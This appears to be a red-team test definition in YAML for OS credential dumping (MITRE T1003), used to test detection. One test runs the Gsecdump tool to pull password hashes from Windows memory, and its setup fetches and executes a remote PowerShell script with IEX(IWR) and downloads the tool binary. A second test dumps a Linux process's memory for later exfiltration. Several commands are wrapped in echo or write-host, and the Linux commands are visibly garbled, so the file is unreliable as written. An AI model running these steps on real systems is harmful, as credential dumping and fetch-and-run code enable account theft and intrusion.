attack_technique: T1003
display_name: OS Credential Dumping
atomic_tests:

- name: Gsecdump
  auto_generated_guid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
  description: |
    Dump credentials from memory using Gsecdump.

    Upon successful execution, you should see domain\username's following by two 32 characters hashes.

    If you see output that says "compat: error: failed to create child process", execution was likely blocked by Anti-Virus. 
    You will receive only error output if you do not run this test from an elevated context (run as administrator)

    If you see a message saying "The system cannot find the path specified", try using the get-prereq_commands to download and install Gsecdump first.
  supported_platforms:
  - windows
  input_arguments:
    gsecdump_exe:
      description: Path to the Gsecdump executable
      type: Path
      default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
    gsecdump_bin_hash:
      description: File hash of the Gsecdump binary file
      type: string
      default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
    gsecdump_url:
      description: Path to download Gsecdump binary file
      type: Url
      default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Gsecdump must exist on disk at specified location (#{gsecdump_exe})
    prereq_command: |
      write-host "if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}"
    get_prereq_command: |
      write-host "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
      if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
        Move-Item $binpath "#{gsecdump_exe}"
      }"
  executor:
    command: |
      write-host "#{gsecdump_exe} -a"
    name: command_prompt
    elevation_required: true

- name: Dump individual process memory with sh (Local)
  auto_generated_guid: 7e91138a-8e74-456d-a007-973d67a0bb80
  description: |
    Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
    copy process memory to an external file so it can be searched or exfiltrated later.

  supported_platforms:
    - linux

  input_arguments:
    output_file:
      description: Path where captured results will be placed
      type: Path
      default: /tmp/T1003.007.bin
    script_path:
      description: Path to script generating the target process
      type: Path
      default: /tmp/T1003.007.sh
    pid_term:
      description: Unique string to use to identify target process
      type: string
      default: T1003.007

  dependencies:
    - description: |
        Script to launch target process must exist
      prereq_command: |
        echo "test -f #{script_path}"
        echo "grep "#{pid_term}" #{script_path}"
      get_prereq_command: |
        echo '#!/bin/sh' > #{script_path}
        echo 'The password is #{pid_term}\ sleep 30 #{script_path}'
  
  executor:
    name: sh
    elevation_required: true
    command: |
      echo "#{script_path}"
      echo "mem of="#{output_file}""
    cleanup_command: |
      echo "removing #{output_file}"